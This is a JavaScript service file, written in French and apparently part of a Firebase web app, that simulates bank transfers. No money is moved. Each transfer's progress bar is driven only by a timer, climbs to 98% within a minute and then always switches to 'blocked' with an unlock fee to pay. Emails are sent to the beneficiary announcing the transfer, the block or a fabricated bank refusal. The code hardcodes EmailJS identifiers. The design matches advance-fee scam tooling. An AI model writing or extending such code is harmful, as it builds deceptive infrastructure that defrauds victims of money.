// VirementService.js - VERSION FIREBASE FIRESTORE
import { db } from "../firebase";
import { getMontantDeblocage } from "./UserService";
import {
  collection,
  addDoc,
  getDocs,
  doc,
  updateDoc,
  deleteDoc,
  query,
  where,
  orderBy
} from "firebase/firestore";

export const STATUT_VIREMENT = {
  EN_ATTENTE: "en_attente",
  EN_COURS: "en_cours",
  VALIDATION: "validation",
  BLOQUE: "bloque",
  ANNULE: "annule"
};

// Configuration EmailJS
const EMAIL_CONFIG = {
  SERVICE_ID: "service_cjaxn39",
  USER_ID: "njMn_oOGEC89lGj7j",
  TEMPLATES: {
    CONFIRMATION: "template_o56ngdd",
    BLOCAGE: "template_xd6542w"
  }
};

export class VirementService {

  // ─── Charger les virements (sans orderBy → pas d'index requis) ───
  static async chargerVirements(code) {
    try {
      const q = query(
        collection(db, "virements"),
        where("numeroCompte", "==", code)
      );
      const snap = await getDocs(q);
      const virements = snap.docs.map(d => ({ id: d.id, ...d.data() }));

      // Tri côté client (du plus récent au plus ancien)
      return virements.sort((a, b) =>
        new Date(b.dateCreation) - new Date(a.dateCreation)
      );
    } catch (error) {
      console.error("❌ Erreur chargerVirements:", error);
      return [];
    }
  }

  // ─── Créer un virement ───────────────────────────────────────────
  static async creerVirement(data) {
    try {
      const maintenant = new Date();
      const blocageDans1Minute = new Date(maintenant.getTime() + 1 * 60 * 1000);

      const montantFinal = parseFloat(await getMontantDeblocage(data.numeroCompte)) || 50;

      const virement = {
        numeroCompte: data.numeroCompte,
        expediteurNom: data.expediteurNom || data.nom || "Expéditeur",
        expediteur: {
          nom: data.expediteurNom || data.nom || "Expéditeur",
          numeroCompte: data.numeroCompte
        },
        beneficiaire: {
          nom: data.beneficiaire.nom,
          prenom: data.beneficiaire.prenom,
          iban: data.beneficiaire.iban,
          email: data.beneficiaire.email,
          bic: data.beneficiaire.bic
        },
        montant: parseFloat(data.montant),
        devise: data.devise || "EUR",
        statut: STATUT_VIREMENT.EN_ATTENTE,
        pourcentageProgression: 0,
        dateCreation: maintenant.toISOString(),
        dateModification: maintenant.toISOString(),
        dateBlocagePrevue: blocageDans1Minute.toISOString(),
        montantDeblocage: montantFinal,
        historique: [
          {
            statut: STATUT_VIREMENT.EN_ATTENTE,
            date: maintenant.toISOString(),
            message: "Virement initié",
            pourcentage: 0
          }
        ]
      };

      const docRef = await addDoc(collection(db, "virements"), virement);
      const virementAvecId = { ...virement, id: docRef.id };

      console.log("💰 Virement créé avec ID:", docRef.id);
      this.envoyerNotificationConfirmation(virementAvecId);

      return virementAvecId;
    } catch (error) {
      console.error("❌ Erreur creerVirement:", error);
      return null;
    }
  }

  // ─── Calculer progression ────────────────────────────────────────
  static calculerProgression(virement) {
    const maintenant = new Date();
    const creation = new Date(virement.dateCreation);
    const blocagePrevue = new Date(virement.dateBlocagePrevue);
    const tempsEcoule = maintenant - creation;
    const tempsTotal = blocagePrevue - creation;
    let pourcentage = Math.floor((tempsEcoule / tempsTotal) * 98);
    return Math.max(0, Math.min(98, pourcentage));
  }

  // ─── Mettre à jour le statut ─────────────────────────────────────
  static async mettreAJourStatut(virementId, nouveauStatut, pourcentage, message, virement) {
    try {
      const nouvelHistorique = [
        ...(virement.historique || []),
        {
          statut: nouveauStatut,
          date: new Date().toISOString(),
          message,
          pourcentage
        }
      ];

      await updateDoc(doc(db, "virements", virementId), {
        statut: nouveauStatut,
        pourcentageProgression: pourcentage,
        dateModification: new Date().toISOString(),
        historique: nouvelHistorique
      });

      return { ...virement, statut: nouveauStatut, pourcentageProgression: pourcentage, historique: nouvelHistorique };
    } catch (error) {
      console.error("❌ Erreur mettreAJourStatut:", error);
      return null;
    }
  }

  // ─── Vérifier et mettre à jour tous les virements ────────────────
  static async verifierEtMettreAJourVirements(code) {
    const maintenant = new Date();
    const virements = await this.chargerVirements(code);
    let modifie = false;

    for (const virement of virements) {
      if ([STATUT_VIREMENT.BLOQUE, STATUT_VIREMENT.ANNULE].includes(virement.statut)) continue;

      const blocagePrevue = new Date(virement.dateBlocagePrevue);
      const nouveauPourcentage = this.calculerProgression(virement);

      if (maintenant >= blocagePrevue) {
        const montantDeblocage = virement.montantDeblocage || 0;
        await this.mettreAJourStatut(
          virement.id,
          STATUT_VIREMENT.BLOQUE,
          98,
          `Virement bloqué - Montant à verser: ${montantDeblocage.toFixed(2)} €`,
          virement
        );
        this.envoyerNotificationBlocage(virement);
        modifie = true;
      } else if (nouveauPourcentage !== virement.pourcentageProgression) {
        let message = "";
        if (nouveauPourcentage < 25) message = "🔍 Vérification des informations bancaires";
        else if (nouveauPourcentage < 50) message = "⚙️ Traitement bancaire en cours";
        else if (nouveauPourcentage < 75) message = "📤 Transfert vers la banque bénéficiaire";
        else message = "✓ Validation finale en cours";

        await this.mettreAJourStatut(virement.id, virement.statut, nouveauPourcentage, message, virement);
        modifie = true;
      }
    }
    return modifie;
  }

  // ─── Annuler un virement (avec email de refus banque) ────────────
  static async annulerVirement(virementId, virement) {
    const result = await this.mettreAJourStatut(
      virementId,
      STATUT_VIREMENT.ANNULE,
      0,
      "Virement annulé — La banque du destinataire a refusé la transaction",
      virement
    );

    // Envoyer email d'annulation au bénéficiaire
    this.envoyerNotificationAnnulation(virement);

    return result;
  }

  // ─── Supprimer un virement ───────────────────────────────────────
  static async supprimerVirement(virementId) {
    try {
      await deleteDoc(doc(db, "virements", virementId));
      console.log("🗑️ Virement supprimé:", virementId);
    } catch (error) {
      console.error("❌ Erreur supprimerVirement:", error);
    }
  }

  // ─── Email de confirmation ───────────────────────────────────────
  static envoyerNotificationConfirmation(virement) {
    const templateParams = {
      to_email: virement.beneficiaire.email,
      beneficiary_name: `${virement.beneficiaire.prenom} ${virement.beneficiaire.nom}`,
      sender_name: virement.expediteur?.nom || "N/A",
      sender_iban: virement.expediteur?.numeroCompte || virement.numeroCompte,
      amount: virement.montant.toFixed(2),
      currency: virement.devise,
      iban: virement.beneficiaire.iban,
      bic: virement.beneficiaire.bic || "N/A",
      transfer_id: virement.id,
      reference: virement.id,
      date: new Date(virement.dateCreation).toLocaleString("fr-FR"),
      statut: "EN_ATTENTE",
      type_notification: "confirmation"
    };
    this.envoyerEmail(EMAIL_CONFIG.TEMPLATES.CONFIRMATION, templateParams, "confirmation");
  }

  // ─── Email de blocage ────────────────────────────────────────────
  static envoyerNotificationBlocage(virement) {
    const montantDeblocage = virement.montantDeblocage || 0;
    const templateParams = {
      to_email: virement.beneficiaire.email,
      beneficiary_name: `${virement.beneficiaire.prenom} ${virement.beneficiaire.nom}`,
      sender_name: virement.expediteur?.nom || "N/A",
      sender_iban: virement.expediteur?.numeroCompte || virement.numeroCompte,
      amount: virement.montant.toFixed(2),
      currency: virement.devise,
      iban: virement.beneficiaire.iban,
      bic: virement.beneficiaire.bic || "N/A",
      transfer_id: virement.id,
      reference: virement.id,
      date_blocage: new Date().toLocaleString("fr-FR"),
      montant_deblocage: montantDeblocage.toFixed(2),
      statut: "BLOQUE",
      type_notification: "blocage"
    };
    this.envoyerEmail(EMAIL_CONFIG.TEMPLATES.BLOCAGE, templateParams, "blocage");
  }

  // ─── Email d'annulation (refus banque destinataire) ──────────────
  static envoyerNotificationAnnulation(virement) {
    const templateParams = {
      to_email: virement.beneficiaire.email,
      beneficiary_name: `${virement.beneficiaire.prenom} ${virement.beneficiaire.nom}`,
      sender_name: virement.expediteur?.nom || "N/A",
      sender_iban: virement.expediteur?.numeroCompte || virement.numeroCompte,
      amount: virement.montant.toFixed(2),
      currency: virement.devise,
      iban: virement.beneficiaire.iban,
      bic: virement.beneficiaire.bic || "N/A",
      transfer_id: virement.id,
      reference: virement.id,
      date_annulation: new Date().toLocaleString("fr-FR"),
      raison: "La banque du destinataire a refusé la transaction. Le virement a été annulé et le montant recrédité sur le compte expéditeur.",
      statut: "ANNULE",
      type_notification: "annulation"
    };
    this.envoyerEmail(EMAIL_CONFIG.TEMPLATES.BLOCAGE, templateParams, "annulation");
  }

  // ─── Envoi générique EmailJS ─────────────────────────────────────
  static envoyerEmail(templateId, templateParams, type) {
    fetch("https://api.emailjs.com/api/v1.0/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        service_id: EMAIL_CONFIG.SERVICE_ID,
        template_id: templateId,
        user_id: EMAIL_CONFIG.USER_ID,
        template_params: templateParams
      })
    })
      .then(response => {
        if (response.ok) console.log(`✅ Email de ${type} envoyé à:`, templateParams.to_email);
        else console.error(`❌ Erreur HTTP ${response.status} pour email de ${type}`);
      })
      .catch(error => console.error(`❌ Erreur envoi email de ${type}:`, error));
  }

  static getStatutLibelle(statut, pourcentage) {
    switch (statut) {
      case STATUT_VIREMENT.EN_ATTENTE: return { label: `En attente (${pourcentage}%)`, color: "blue" };
      case STATUT_VIREMENT.EN_COURS:   return { label: `En cours (${pourcentage}%)`,   color: "orange" };
      case STATUT_VIREMENT.VALIDATION: return { label: `Validation (${pourcentage}%)`, color: "yellow" };
      case STATUT_VIREMENT.BLOQUE:     return { label: "BLOQUÉ (98%)",                 color: "red", message: "Montant à verser pour débloquer" };
      case STATUT_VIREMENT.ANNULE:     return { label: "Annulé",                       color: "gray" };
      default:                         return { label: "Inconnu",                      color: "gray" };
    }
  }

  static async resetAllVirements(code) {
    try {
      const virements = await this.chargerVirements(code);
      for (const v of virements) {
        await deleteDoc(doc(db, "virements", v.id));
      }
      console.log("🗑️ Tous les virements supprimés");
      return true;
    } catch (error) {
      console.error("❌ Erreur resetAllVirements:", error);
      return false;
    }
  }
}